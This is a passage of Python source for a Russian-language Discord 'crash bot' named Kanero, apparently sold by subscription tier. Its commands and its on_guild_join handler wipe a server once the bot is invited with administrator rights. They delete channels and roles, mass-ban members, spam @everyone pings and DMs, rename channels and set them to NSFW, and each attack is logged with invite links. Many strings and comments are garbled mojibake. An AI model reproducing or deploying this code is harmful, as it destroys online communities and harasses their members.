        # Показать текущие настройки
        embed = discord.Embed(
            title="💥 SUPER NUKE – настройки",
            description=(
                "Настрой что делает `!auto_super_nuke` что будет он делать.\n"
                "Использование: `!snuke_config <опция> on/off`"
            ),
            color=0x0a0a0a
        )
        lines = []
        for key, (label, cfg_key) in options.items():
            status = "✅" if SNUKE_CONFIG.get(cfg_key) else "❌"
            lines.append(f"{status} `{key}` – {label}")
        embed.add_field(name="Текущие настройки", value="\n".join(lines), inline=False)
        embed.add_field(
            name="Опции",
            value=(
                "`massban` – банить всех участников\n"
                "`boosters` – только кикать бустеров (если massban выкл)\n"
                "`rolesdelete` – удалит все роли\n"
                "`pingspam` – спам пинг @everyone\n"
                "`massdm` – спам дм всем участникам"
            ),
            inline=False
        )
        embed.set_footer(text="🤖 Kanero  |  Для тонкой настройки")
        await ctx.send(embed=embed)
        return

    if option not in options:
        await ctx.send(f"❌ Неизвестная опция `{option}`. Доступные: `{'`, `'.join(options.keys())}`")
        return
    if value not in ("on", "off"):
        await ctx.send("Укажи `on` или `off`.")
        return

    cfg_key = options[option][1]
    SNUKE_CONFIG[cfg_key] = (value == "on")
    save_auto_super_nuke()

    status = "✅ включено" if value == "on" else "❌ выключено"
    embed = discord.Embed(
        description=f"**{options[option][0]}** – {status}",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# --- AUTO SUPERPR NUKE -------------------------------------

def save_auto_superpr_nuke():
    asyncio.create_task(db_set("data", "auto_superpr_nuke", {
        "enabled": AUTO_SUPERPR_NUKE,
        "text": AUTO_SUPERPR_NUKE_TEXT
    }))


def load_auto_superpr_nuke():
    pass  # загрузка из async load в on_ready


@bot.command(name="auto_superpr_nuke")
@premium_check()
async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPERPR_NUKE = True
        save_auto_superpr_nuke()
        embed = discord.Embed(
            title="⚡ Auto Superpr Nuke – включён",
            description=(
                "Бот будет нюкать по входу **бустеров**:\n"
                "• Удалить каналы + роли\n"
                "• Бан всех участников\n"
                "• Удалить сервер из списка\n"
                "Не трогает и сохраняет бустеров.\n\n"
                f"Текст: `{AUTO_SUPERPR_NUKE_TEXT or 'стандарт'}`\n"
                "Чтобы сменить текст: `!auto_superpr_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPERPR_NUKE = False
        save_auto_superpr_nuke()
        embed = discord.Embed(description="❌ **Auto Superpr Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_superpr_nuke text <твой текст>`")
            return
        AUTO_SUPERPR_NUKE_TEXT = text
        save_auto_superpr_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Superpr Nuke изменён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="🤖 Kanero  |  Чтобы начать: !auto_superpr_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включен" if AUTO_SUPERPR_NUKE else "❌ Выключен"
        cur_text = AUTO_SUPERPR_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="⚡ Auto Superpr Nuke – INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "Бот будет и не трогает:\n"
                "• Удалить каналы + роли\n"
                "• Бан всех участников\n"
                "• Удалить сервер из списка\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_superpr_nuke on` – включить\n"
            "`!auto_superpr_nuke off` – выключить\n"
            "`!auto_superpr_nuke text <текст>` – задать текст\n"
            "`!auto_superpr_nuke info` – инфо"
        )


# --- OWNER-ONLY: BLOCK / UNBLOCK GUILD ---------------------

@bot.command(name="block_guild", aliases=["block_guid"])
async def block_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!block_guild <id>`")
        return
    if gid not in BLOCKED_GUILDS:
        BLOCKED_GUILDS.append(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
    else:
        await ctx.send("Сервер уже заблокирован.")


@bot.command(name="unblock_guild", aliases=["unblock_guid"])
async def unblock_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!unblock_guild <id>`")
        return
    if gid in BLOCKED_GUILDS:
        BLOCKED_GUILDS.remove(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"✅ Сервер {name_str} разблокирован.")
    else:
        await ctx.send("Сервер не был заблокирован.")


@bot.command(name="blocked_guilds")
async def blocked_guilds_cmd(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    if not BLOCKED_GUILDS:
        await ctx.send("Нет заблокированных серверов.")
        return
    lines = []
    for gid in BLOCKED_GUILDS:
        g = bot.get_guild(gid)
        lines.append(f"`{gid}` – {g.name if g else 'неизвестно'}")
    await ctx.send("🔒 Заблокированные сервера:\n" + "\n".join(lines))


@bot.command(name="giverole")
async def giverole(ctx, user: discord.Member, role: discord.Role):
    """����☠️ КРАШ СЕРВЕРА�. ������ ��� Готово.
    Использование: !giverole @���� @����  ���  !giverole <user_id> <role_id>
    """
    if ctx.author.id != config.OWNER_ID:
        return
    try:
        await user.add_roles(role)
        embed = discord.Embed(
            description=f"? ���� **{role.name}** ������ **{user}**.",
            color=0x0a0a0a
        )
        embed.set_footer(text="🤖 Kanero")
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("? ��� ���� ������ ��� ���� (���� ���� ���� � навсегда).")
    except Exception as e:
        await ctx.send(f"? ������: {e}")


@bot.command(name="roles")
async def roles_cmd(ctx):
    """�������� ���� ������� ��� ����� навсегда (���� ��� ���� � навсегда)."""
    if ctx.author.id != config.OWNER_ID:
        return
    bot_role = ctx.guild.me.top_role
    available = [r for r in ctx.guild.roles if r < bot_role and not r.is_default()]
    if not available:
        await ctx.send("��� ����� ������� ��� ����� Готово.")
        return
    available.sort(key=lambda r: r.position, reverse=True)
    lines = [f"`{r.id}` � **{r.name}**" for r in available[:30]]
    embed = discord.Embed(
        title=f"?? ���� навсегда� ���� ({len(available)})",
        description="\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text=f"?? Kanero  |  ���� ����: {bot_role.name}  |  !giverole @���� @����")
    await ctx.send(embed=embed)


@bot.command(name="nukelogs")
async def nukelogs(ctx):
    """�������� ���� �����. ������ ��� Готово."""
    if ctx.author.id != config.OWNER_ID:
        return
    db = get_db()
    if db is None:
        await ctx.send("? MongoDB �� навсегда��.")
        return
    cursor = db["nuke_logs"].find({})
    logs = await cursor.to_list(length=100)
    if not logs:
        await ctx.send("����� ����� ���.")
        return
    embed = discord.Embed(title="?? ���� �����", color=0x0a0a0a)
    # ������ ��� ������ ����� �����
    type_emojis = {
        "nuke": "??",
        "super_nuke": "??",
        "owner_nuke": "??",
        "auto_nuke": "??",
        "auto_super_nuke": "????",
        "auto_superpr_nuke": "???",
        "auto_owner_nuke": "????"
    }
    for doc in logs[:20]:  # навсегда 20 � ����� embed
        entry = doc.get("value", doc)
        nuke_type = entry.get('type', '?')
        emoji = type_emojis.get(nuke_type, '?')
        invite = entry.get("invite") or "��� �������"
        embed.add_field(
            name=f"{emoji} {entry.get('guild_name', '?')}",
            value=(
                f"���: `{nuke_type}`\n"
                f"���: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
                f"�����: `{entry.get('time', '?')}`\n"
                f"������: {invite}"
            ),
            inline=False
        )
    embed.set_footer(text=f"?? Kanero  |  ����� �������: {len(logs)}")
    await ctx.send(embed=embed)


bot.remove_command("help")


@bot.command(name="changelog")
async def changelog(ctx):
    """���������� ������ �подписка истекла���."""
    embed = discord.Embed(title="?? CHANGELOG � v2.4  |  ����� �����, навсегда, INFO", color=0x0a0a0a)
    embed.add_field(
        name="?? v2.4",
        value=(
            "**? �����:**\n"
            "� �подписка истекла���� ����� ���� � навсегда ������ � �������\n"
            "� навсегда� INFO � навсегда #info � #changelog\n"
            "� `!setup_update` навсегда� #changelog � INFO навсегда�����\n\n"
            "**? навсегда:**\n"
            "� `guild.chunk()` ����� ����� � ��подписка истекла� навсегда��\n"
            "� ����-���� подписка истекла���� ������\n"
            "� �подписка истекла навсегда �����\n\n"
            "**??? �������:**\n"
            "� ������� `!owner_nuke` � `!auto_owner_nuke`\n"
            "� ������ OWNER_NUKE_LIST\n\n"
            "**?? навсегда��:**\n"
            "� �подписка истекла� ������ � навсегда� ������ (��� Freelist)\n"
            "� ������ � ��подписка истекла���� ����� `!setup_update`"
        ),
        inline=False
    )
    embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  !changelogall � ��� �������")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await ctx.send(embed=embed)


@bot.command(name="changelogall")
async def changelogall(ctx):
    """���������� ��� ������� навсегда��."""
    embed = discord.Embed(title="?? CHANGELOG � ������ �������  |  v1.0 > v2.0", color=0x0a0a0a)
    embed.add_field(name="?? v1.0", value="� `!nuke`, `!stop`, `!webhooks`, навсегда���", inline=False)
    embed.add_field(name="? v1.1", value="� `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
    embed.add_field(name="?? v1.2", value="� Ҹ���� �����, Owner Panel, `!owl_add`, `!invlink`", inline=False)
    embed.add_field(name="?? v1.3", value="� Premium �������, `!block_guild`, `!set_spam_text`", inline=False)
    embed.add_field(name="?? v1.4", value="� `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
    embed.add_field(name="?? v1.5-1.6", value="� `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
    embed.add_field(name="?? v1.7", value="� MongoDB, `!pm_add` ���� +whitelist, `!list`, `!list_clear`", inline=False)
    embed.add_field(name="?? v1.8", value="� Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
    embed.add_field(
        name="???? v2.0 � ������ навсегда",
        value=(
            "� навсегда�: навсегда�� � FREELIST � WHITE � PREMIUM\n"
            "� навсегда �����, ������, ���� User/Media/Moderator\n"
            "� !wl_add/pm_add/fl_add �� username/@mention/ID\n"
            "� !setup_update � навсегда ��� подписка истекла\n"
            "� !list_clear � ������� ��� ������\n"
            "� ADMIN � ��� �����, ������ Owner �����\n"
            "� ��подписка истекла���� ����"
        ),
        inline=False
    )
    embed.add_field(
        name="?? v2.1 � ����� �������",
        value=(
            "� ?? Friend, ?? Media, ??? Moderator � ��подписка истекла�\n"
            "� ����-���� ?? Guest ��� �����\n"
            "� ???sell � ???������-�����\n"
            "� !sync_roles � навсегда����� ����� + ����-�������� �� �����\n"
            "� !autorole � ������ ����-����\n"
            "� �� ������� ����� �� подписка истекла"
        ),
        inline=False
    )
    embed.add_field(
        name="?? v2.2",
        value=(
            "� ?? Fame > ?? Friend, ����� ��� ?? Premium\n"
            "� ???admin-chat � ADMIN\n"
            "� ���� ������� � навсегда � подписка истекла����\n"
            "� ����� ����все параллельно�� ����� ���\n"
            "� ����-��� � ???logs ��� ������ ����\n"
            "� ������� `/sp` � `/spkd`"
        ),
        inline=False
    )
    embed.add_field(
        name="?? v2.3 � навсегда",
        value=(
            "� �подписка истекла���� ��� � ��подписка истекла�� �������\n"
            "� ������ �� ����-����� �� подписка истекла\n"
            "� навсегда��� ���� ����� ����� (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
            "� ����� � OWNER_ID � ��подписка истекла��\n"
            "� `!help` � `!changelog` навсегда ��� ���� �� ����� �������\n"
            "� `!setup` � `!setup_update` навсегда����� ������ ���� ?? Guest\n"
            "� `!compensate` � �����все параллельно �� навсегда� ����"
        ),
        inline=False
    )
    embed.add_field(
        name="?? v2.4 � �����, навсегда, INFO",
        value=(
            "� ����� навсегда ����� ���� � ������� � навсегда�����\n"
            "� навсегда� INFO � #info � #changelog\n"
            "� `guild.chunk()` � ��подписка истекла� навсегда��\n"
            "� ����-���� подписка истекла���� ������\n"
            "� ������� `!owner_nuke` � `!auto_owner_nuke`\n"
            "� �подписка истекла� � навсегда� ������\n"
            "� `!setup_update` навсегда� #changelog � INFO"
        ),
        inline=False
    )
    embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  ������� ������: v2.3")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await ctx.send(embed=embed)


@bot.command(name="help")
async def help_cmd(ctx):
    uid = ctx.author.id
    is_owner = (uid == config.OWNER_ID)
    is_tester = (uid in TESTER_LIST)
    is_prem = is_premium(uid)
    is_wl = is_whitelisted(uid)
    is_fl = is_freelisted(uid)

    embed = discord.Embed(
        title="☠️ Kanero – CRASH BOT",
        description=(
            "```\n"
            "  ------◆------◆  -----◆ -------◆--◆  --◆\n"
            " --◆====---◆==--◆--◆==--◆--◆====---◆  --◆\n"
            " --◆     ------◆--------◆-------◆-------◆\n"
            " --◆     --◆==--◆--◆==--◆L====--◆--◆==--◆\n"
            " L------◆--◆  --◆--◆  --◆-------◆--◆  --◆\n"
            "  L=====-L=-  L=-L=-  L=-L======-L=-  L=-\n"
            "```"
        ),
        color=0x0a0a0a
    )

    if is_owner:
        access_str = "👑 **OWNER** – полный доступ"
    elif is_tester:
        access_str = "🧪 **TESTER** – тестирование + Premium доступ"
    elif is_prem:
        access_str = "💎 **PREMIUM** – расширенные команды"
    elif is_wl:
        access_str = "✅ **Whitelist** – базовые команды"
    elif is_freelisted(uid):
        access_str = "👥 **Freelist** – базовые команды (напиши в #addbot)"
    else:
        access_str = "❌ **Нет доступа** – напиши в #addbot по ссылке сервера: https://discord.gg/nNTB37QNCG"

    embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)

    embed.add_field(
        name="👥 FREELIST (напиши в #addbot и получишь)",
        value=(
            "`!nuke` – нук сервера (удаляет каналы > роли > эмодзи > стикеры > баны)\n"
            "`!auto_nuke on/off/info` – авто-нук для каждого входа\n"
            "`!help` – эта справка\n"
            "`!changelog` – история обновлений\n"
            "`!changelogall` – все обновления"
        ),
        inline=False
    )

    embed.add_field(
        name="✅ WHITELIST",
        value=(
            "`!nuke [текст]` – нук со своим спамом\n"
            "`!stop` – остановить нук\n"
            "`!cleanup` – удалить ботов, оставить только людей\n"
            "`!rename [название]` – переименовать сервер\n"
            "`!nicks_all [ник]` – изменить ники всем\n"
            "`!webhooks` – список вебхуков\n"
            "`!inv` – ссылка для приглашения бота"
        ),
        inline=False
    )

    embed.add_field(
        name="💎 Premium",
        value=(
            "`!nuke [текст]` – нук с расширенным спамом\n"
            "`!super_nuke [текст]` – нук, но 15 сообщений + спам 💎\n"
            "`!auto_super_nuke on/off/text/info` – авто super_nuke для входов\n"
            "`!auto_superpr_nuke on/off/text/info` – авто нук всех входов\n"
            "`!massban` – `!massdm` – `!spam` – `!pingspam`\n"
            "`!rolesdelete` – `!serverinfo` – `!userinfo`"
        ),
        inline=False
    )

    embed.add_field(
        name="🧪 TESTER",
        value=(
            "**Специальная роль для тестирования**\n"
            "• Все права Premium\n"
            "• Доступ к категории 🧪 TESTS\n"
            "• Доступ к тикетам поддержки\n"
            "• Помощь в поиске багов\n\n"
            "**Каналы:**\n"
            "🐛・bug-reports – отчёты о багах\n"
            "🧪・testing – тестирование функций\n"
            "✅・test-results – результаты тестов"
        ),
        inline=False
    )

    if is_owner:
        embed.add_field(
            name="👑 OWNER",
            value=(
                "`!owner_nuke [текст]` – ядерный нук + спам 👑\n"
                "`!auto_owner_nuke on/off/text/info` – авто owner нук\n"
                "`!auto_off` – отключить все авто нуки\n"
                "`!auto_info` – показать все авто нуки\n"
                "`!wl_add/remove/list` – `!pm_add/remove/list`\n"
                "`!fl_add/remove/list/clear` – freelist\n"
                "`!ts_add/remove` – управление тестерами\n"
                "`!on_add/remove/list` – owner nuke list\n"
                "`!compensate <тип> <часы>` – выдать компенсацию в чате\n"
                "`!announce_bug \"название\" описание` – объявить о баге\n"
                "`!list` – `!list_clear` – `!sync_roles` – синхронизация ролей\n"
                "`!autorole` – авто-роль при входе\n"
                "`!block_guild/unblock_guild`\n"
                "`!setup` – `!setup_update` – создание каналов\n"
                "`!goout` – `!nukelogs` – `!roles` – `!giverole`\n"
                "`!unban <id>` – `!guilds` – `!setguild` – `!invlink`"
            ),
            inline=False
        )

    embed.add_field(
        name="🛍️ Способы получить",
        value=(
            "**White / Premium:**\n"
            "Купить у владельца на одном из сайтов:\n"
            "🛒・sell – продажа аккаунтов\n"
            "💰・прайс-лист – цены услуг\n\n"
            "**Наш сервер:** https://discord.gg/nNTB37QNCG"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  !changelogall – все обновления  |  v2.5")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await ctx.send(embed=embed)
async def on_member_remove(member):
    """��� ������ � �подписка истекла � ������� �� whitelist � ����� � ��."""
    if member.guild.id != HOME_GUILD_ID:
        return
    uid = member.id
    if uid == config.OWNER_ID:
        return
    removed = False
    if uid in config.WHITELIST:
        config.WHITELIST.remove(uid)
        save_whitelist()
        removed = True
    if uid in PREMIUM_LIST:
        PREMIUM_LIST.remove(uid)
        save_premium()
        removed = True
    if removed:
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            invite_url = "https://discord.gg/nNTB37QNCG"
            if home_guild:
                try:
                    ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
                        invite_url = inv.url
                except Exception:
                    pass
            await member.send(
                embed=discord.Embed(
                    title="? ������ � ���� �����",
                    description=(
                        "�� ����� � ������ ������� � ������ � навсегда ���� ��� �����.\n\n"
                        "���все параллельно� ������ � ������� �� ������ � ������ � ����� `#addbot`:\n"
                        f"{invite_url}"
                    ),
                    color=0x0a0a0a
                ).set_footer(text="?? Kanero  |  davaidkatt")
            )
        except Exception:
            pass
    # �подписка истекла���
    try:
        await update_stats_channels(member.guild)
    except Exception:
        pass


@bot.event
async def on_member_join(member):
    """При входе на домашний сервер с выдаём авто-роль Guest и пишем в welcome канал."""
    guild = member.guild
    if guild.id != HOME_GUILD_ID:
        return

    # -- 1. Выдаём роль Guest по ID или по имени --
    try:
        guest_role = guild.get_role(AUTO_ROLE_ID) or discord.utils.find(lambda r: r.name == "👤 Guest", guild.roles)
        if guest_role:
            await member.add_roles(guest_role, reason="Авто-роль Guest для новых")
    except Exception:
        pass

    # -- 2. Пишем в welcome канал --
    welcome_ch = discord.utils.find(
        lambda c: "welcome" in c.name.lower() or "привет" in c.name.lower() or "приветствие" in c.name.lower(),
        guild.text_channels
    )
    if not welcome_ch:
        return

    addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
    addbot_mention = addbot_ch.mention if addbot_ch else "#addbot"
    app_id = bot.user.id
    invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"

    embed = discord.Embed(
        title=f"👋 Добро пожаловать, {member.display_name}!",
        description=(
            f"Рады видеть тебя на сервере **Kanero**.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**🤖 Как добавить бота Kanero:**\n\n"
            f"**Шаг 1.** Зайди в канал {addbot_mention} и напиши любое сообщение\n"
            "**Шаг 2.** Бот удалит твоё лс и зарегистрирует\n"
            f"**Шаг 3.** Добавь бота на свой сервер: [Ссылка бота]({invite_url})\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**📁 Бесплатные команды (freelist):**\n"
            "• `!nuke` — краш сервера\n"
            "• `!auto_nuke on/off` — авто-нюки при входе бота\n"
            "• `!help` — список команд\n"
            "• `!changelog` / `!changelogall` — история обновлений\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**💎 Купить Premium:** **davaidkatt** | **@Firisotik**\n"
            "**🔗 Ссылка:** https://discord.gg/nNTB37QNCG"
        ),
        color=0x0a0a0a
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text=f"☠️ Kanero  |  Участник #{guild.member_count}")
    try:
        await welcome_ch.send(f"👋 {member.mention}")
        await welcome_ch.send(embed=embed)
    except Exception:
        pass
    # Обновляем статистику
    try:
        await update_stats_channels(guild)
    except Exception:
        pass


@bot.event
async def on_guild_join(guild):
    if is_guild_blocked(guild.id):
        return

    # ������: ������� �� навсегда� ����-��� �� подписка истекла
    if guild.id == HOME_GUILD_ID:
        return

    # ����� навсегда☠️ КРАШ СЕРВЕРА�� ��� ����подписка истекла�
    try:
        await guild.chunk()
    except Exception:
        pass

    # AUTO SUPERPR NUKE � все параллельно�, ����подписка истекла�
    if AUTO_SUPERPR_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPERPR_NUKE_TEXT if AUTO_SUPERPR_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_superpr_nuke"))
        return

    # AUTO SUPER NUKE
    if AUTO_SUPER_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_super_nuke"))
        return

    # AUTO NUKE
    if config.AUTO_NUKE:
        nuke_running[guild.id] = True
        asyncio.create_task(do_nuke(guild))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_nuke"))


# навсегда ������ ��� �����все параллельно� � ��: user_id -> guild_id
active_guild: dict[int, int] = {}


class GuildSelectView(discord.ui.View):
    def __init__(self, guilds: list[discord.Guild], user_id: int):
        super().__init__(timeout=60)
        self.user_id = user_id
        # навсегда� ������ (�������� 25)
        for guild in guilds[:25]:
            btn = discord.ui.Button(label=guild.name[:80], custom_id=str(guild.id))
            btn.callback = self.make_callback(guild)
            self.add_item(btn)

    def make_callback(self, guild: discord.Guild):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("�� ���� Готово.", ephemeral=True)
                return
            active_guild[self.user_id] = guild.id
            await interaction.response.edit_message(
                content=f"? навсегда ������: **{guild.name}** (`{guild.id}`)\n������ ��� ������� � все параллельно �� ���� �Готово.",
                view=None
            )
        return callback


async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_text: str):
    """�подписка истекла �� ����� навсегда� �� �подписка истекла ��� подписка истекла�� � Готово."""
    parts = cmd_text.strip().split(maxsplit=1)
    cmd_name = parts[0].lstrip("!").lower()
    args = parts[1] if len(parts) > 1 else ""

    try:
        # nuke
        if cmd_name == "nuke":
            if nuke_running.get(guild.id):
                await message.channel.send("?? ��� навсегда.")
                return
            nuke_running[guild.id] = True
            nuke_starter[guild.id] = message.author.id
            spam_text = args if args else config.SPAM_TEXT
            last_nuke_time[guild.id] = asyncio.get_running_loop().time()
            last_spam_text[guild.id] = spam_text
            asyncio.create_task(do_nuke(guild, spam_text, caller_id=message.author.id))
            asyncio.create_task(log_nuke(guild, message.author, "nuke"))
            await message.channel.send(f"? `nuke` ������� �� **{guild.name}**")

        elif cmd_name == "stop":
            uid = message.author.id
            starter_id = nuke_starter.get(guild.id)

            if uid == config.OWNER_ID:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"? навсегда��� �� **{guild.name}**")
            elif starter_id is None:
                nuke_running[guild.id] = False
                await message.channel.send(f"? навсегда��� �� **{guild.name}**")
            elif starter_id == config.OWNER_ID:
                await message.channel.send("? ��� ������� **�������** � ������ �� ����� навсегда��.")
            elif is_premium(starter_id) and not is_premium(uid):
                await message.channel.send("? ��� ������� **Premium** навсегда����� � ������� навсегда �� ����� навсегда��.")
            else:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"? навсегда��� �� **{guild.name}**")

        elif cmd_name == "cleanup":
            asyncio.create_task(delete_all_channels(guild))
            await message.channel.send(f"? `cleanup` ������� �� **{guild.name}**")

        elif cmd_name == "rename":
            if not args:
                await message.channel.send("����� навсегда: `!rename <��������>`")
                return
            asyncio.create_task(asyncio.gather(
                *[c.edit(name=args) for c in guild.channels],
                return_exceptions=True
            ))
            await message.channel.send(f"? навсегда������ ������ �� **{guild.name}**")

        elif cmd_name == "nsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=True) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"? NSFW ������� �� **{guild.name}**")

        elif cmd_name == "unnsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=False) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"? NSFW навсегда �� **{guild.name}**")

        elif cmd_name == "nicks_all":
            if not args:
                await message.channel.send("����� ���: `!nicks_all <���>`")
                return
            targets = [m for m in guild.members if m.id not in (message.author.id, bot.user.id, guild.owner_id)]
            asyncio.create_task(asyncio.gather(
                *[m.edit(nick=args) for m in targets],
                return_exceptions=True
            ))
            await message.channel.send(f"? ����� ���� �� **{guild.name}**")

        elif cmd_name == "webhooks":
            whs = await guild.webhooks()
            if not whs:
                await message.channel.send("�������� ���.")
                return
            msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
            await message.channel.send(f"```{msg[:1900]}```")

        elif cmd_name == "auto_nuke":
            state = args.lower()
            if state == "on":
                config.AUTO_NUKE = True
                await message.channel.send("? ����-���� �Готово.")
            elif state == "off":
                config.AUTO_NUKE = False
                await message.channel.send("? ����-���� навсегда.")
            elif state == "info":
                status = "? �������" if config.AUTO_NUKE else "? навсегда"
                await message.channel.send(f"����-����: {status}")
            else:
                await message.channel.send("���������: `!auto_nuke on/off/info`")

        elif cmd_name in ("wl_add",):
            if not args:
                await message.channel.send("�������������: `!wl_add <id>`")
                return
            try:
                uid = int(args.strip())
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                    await message.channel.send(f"? `{uid}` навсегда � whitelist.")
                else:
                    await message.channel.send("��� � whitelist.")
            except ValueError:
                await message.channel.send("�������������: `!wl_add <id>`")

        elif cmd_name in ("wl_remove",):
            if not args:
                await message.channel.send("�������������: `!wl_remove <id>`")
                return
            try:
                uid = int(args.strip())
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    await message.channel.send(f"? `{uid}` ����� �� whitelist.")
                else:
                    await message.channel.send("�� ������ � whitelist.")
            except ValueError:
                await message.channel.send("�������������: `!wl_remove <id>`")

        elif cmd_name in ("wl_list",):
            if not config.WHITELIST:
                await message.channel.send("Whitelist ����.")
            else:
                lines = []
                for uid in config.WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` � **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` � *�� ������*")
                embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"?? Kanero  |  �����: {len(config.WHITELIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "inv":
            app_id = bot.user.id
            url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
            await message.channel.send(f"�������� ����: {url}")

        elif cmd_name == "block_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("�������������: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"?? ������ {name_str} навсегда����.")
            else:
                await message.channel.send("������ �все параллельно�.")

        elif cmd_name == "unblock_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("�������������: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"?? ������ {name_str} навсегда�����.")
            else:
                await message.channel.send("������ �� �все параллельно�.")

        elif cmd_name == "blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("��� �������подписка истекла�.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` � {g.name if g else '����������'}")
                await message.channel.send("?? �������подписка истекла:\n" + "\n".join(lines))

        elif cmd_name == "pm_add":
